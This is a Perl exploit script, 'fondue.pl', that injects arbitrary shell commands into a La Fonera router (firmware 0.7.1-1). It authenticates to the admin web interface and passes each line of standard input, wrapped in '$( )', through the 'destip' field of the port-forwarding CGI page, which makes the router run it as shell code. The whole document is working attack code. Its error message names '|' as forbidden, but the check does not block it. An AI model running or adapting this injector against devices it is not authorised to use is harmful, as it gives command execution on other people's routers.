#!/usr/bin/perl
#
# fondue.pl
#
# Shell code injector for La Fonera
# (local variant, made for 0.7.1-1)
#
# by Michael Kebe <michael.kebe@web.de>
# and Stefan Tomanek <stefan@pico.ruhr.de>
#
# http://stefans.datenbruch.de/lafonera/

use strict;
use warnings;

use WWW::Mechanize;
use MIME::Base64;

sub inject($$$) {
    my ($ip, $password, $code) = @_;
    # create a new browser
    my $browser = WWW::Mechanize->new(autocheck => 1);

    # admin password
    #$browser->credentials($ip,"admin",$password);
    $browser->credentials("admin" => $password);

    my $auth = MIME::Base64::encode("admin:$password");
    $browser->add_header (Authorization=>"Basic $auth");

    $browser->get("http://$ip/cgi-bin/webif/adv_pf.sh");
    $browser->success() or die "UNABLE TO LOGIN.";

    $browser->form_number('1');
    $browser->field("destip", prepareCode($code));
    $browser->click();
    $browser->success() or die "CODE INJECTION FAILED.";
}

sub prepareCode($) {
    my ($code) = @_;
    return '$('.$code.')';
}

sub readCode() {
    print STDERR "By your command...\n";
    my $code = "";
    while (<STDIN>) {
        $code .= $_;
    }
    return $code;
}

sub verifyCode($) {
    my ($code) = @_;
    return not ($code =~ /<|>|&|;/);
}

sub processArgs() {
    # Retrieve user information from command line
    my $ip = shift(@ARGV) || die "Usage: fondue.pl IP PASSWORD";
    my $password = shift(@ARGV) || die "Usage: fondue.pl IP PASSWORD";
    # Read shell code from standard input
    my $code = readCode();
    verifyCode($code) || die "Forbidden characters in command: < > & | ;";
    for my $l (split /\n/, $code) {
	print STDERR "Injecting command »".$l."«...\n";
	inject($ip, $password, $l);
    }
    print STDERR "Code has been injected.\n";
}

processArgs();
